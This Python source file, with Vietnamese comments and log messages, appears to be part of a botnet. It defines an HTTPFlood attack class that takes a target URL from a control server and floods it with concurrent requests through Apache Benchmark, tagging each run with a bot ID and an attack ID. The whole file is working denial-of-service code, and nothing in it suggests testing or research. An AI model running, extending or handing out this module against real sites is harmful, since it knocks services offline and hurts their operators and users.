import asyncio
import logging
from .base import BaseAttack

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

class HTTPFlood(BaseAttack):
    async def execute(self):
        """Thực thi cuộc tấn công HTTP Flood bằng Apache Benchmark (ab)."""
        logging.info(f"Bot {self.bot_id} bắt đầu tấn công với attack_id: {self.attack_id}")
        # Sử dụng target_url từ server, thêm '/' nếu thiếu
        target_url = self.target.rstrip('/') + '/'
        total_requests = int(self.intensity * self.duration)
        concurrent_connections = min(self.intensity, 50)
        command = ["ab", "-n", str(total_requests), "-c", str(concurrent_connections), target_url]
        logging.info(f"Chạy lệnh ab: {' '.join(command)}")
        try:
            process = await asyncio.create_subprocess_exec(
                *command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            await asyncio.sleep(self.duration)
            process.terminate()
            stdout, stderr = await process.communicate()
            logging.info(f"Kết quả HTTP Flood: {stdout.decode()}")
            if stderr:
                logging.error(f"Lỗi HTTP Flood: {stderr.decode()}")
        except Exception as e:
            logging.error(f"Lỗi khi chạy HTTP Flood: {e}")